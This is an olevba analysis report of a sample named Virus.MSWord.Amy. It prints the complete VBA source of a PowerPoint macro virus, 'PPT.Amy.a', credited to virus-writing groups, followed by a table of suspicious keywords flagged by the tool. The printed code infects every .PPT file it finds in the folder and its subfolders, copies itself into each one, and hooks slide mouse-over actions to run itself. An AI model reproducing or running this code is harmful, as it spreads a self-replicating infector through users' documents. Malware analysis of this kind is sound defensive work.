olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Amy
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO Module1.bas 
in file: Virus.MSWord.Amy - OLE stream: 'VBA/Module1'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Const OurAmy = "Amy"
Public SlideAmy As Object
'----------------------------------------------------------------
'PPT.Amy.a
'By -KD- [Metaphase VX Team & NoMercyVirusTeam]
'Greets to Raven, KidCypher, Error-, Foxz, Evul, Roadkil, Tally
'JFK, Slagehammer, AngelsKitten, BSL4, Antistate and #virus
'----------------------------------------------------------------
Sub A\(Amy): On Error Resume Next
If Dir(Application.Path & ".VXD") = "" Then _
ActivePresentation.VBProject.VBComponents(OurAmy).Export Application.Path & ".VXD"
For Each SlideAmy In Presentations
CatchAmy
Next
With Application.FileSearch
 .LookIn = ActivePresentation.Path
 .FileName = "*.PPT"
 .SearchSubFolders = True
 .Execute
 For MyAmy = 1 To .FoundFiles.Count
If .FoundFiles(MyAmy) = ActivePresentation.FullName Then GoTo CatchThis
 Set SlideAmy = Presentations.Open(.FoundFiles(MyAmy))
If SlideAmy.VBProject.VBComponents(OurAmy).Name <> OurAmy Then
 Call CatchAmy
 SlideAmy.Save
End If
SlideAmy.Close
CatchThis Next
End With
End Sub
Private Sub CatchAmy()
On Error Resume Next
If SlideAmy.VBProject.VBComponents(OurAmy).Name <> OurAmy Then
 SlideAmy.VBProject.VBComponents.Import Application.Path & ".VXD"
 For Each AmyAction In SlideAmy.Slides(SlideAmy.Slides.Count).Shapes
If AmyAction.ActionSettings(ppMouseOver).Action = 0 Then
AmyAction.ActionSettings(ppMouseOver).Action = ppActionRunMacro
AmyAction.ActionSettings(ppMouseOver).Run = "A\"
If Day(Date) = "1" Or Day(Date) = "25" Then
Assistant.Visible = True
  With Assistant.NewBalloon
   .Icon = msoIconAlert
   .Text = "Here I am again. again overwhelming feelings. thousand miles away. part of me is here."
   .Heading = "PPT.Amy.a"
   .Animation = msoAnimationGetTechy
   .Show
  End With
Shell "Start http://www.nod32.com.au/"
End If
Next
End If
End Sub

+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|Suspicious|Open                |May open a file                              |
|Suspicious|Shell               |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|Run                 |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|Call                |May call a DLL using Excel 4 Macros (XLM/XLF)|
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|IOC       |http://www.nod32.com|URL                                          |
|          |.au/                |                                             |
+----------+--------------------+---------------------------------------------+

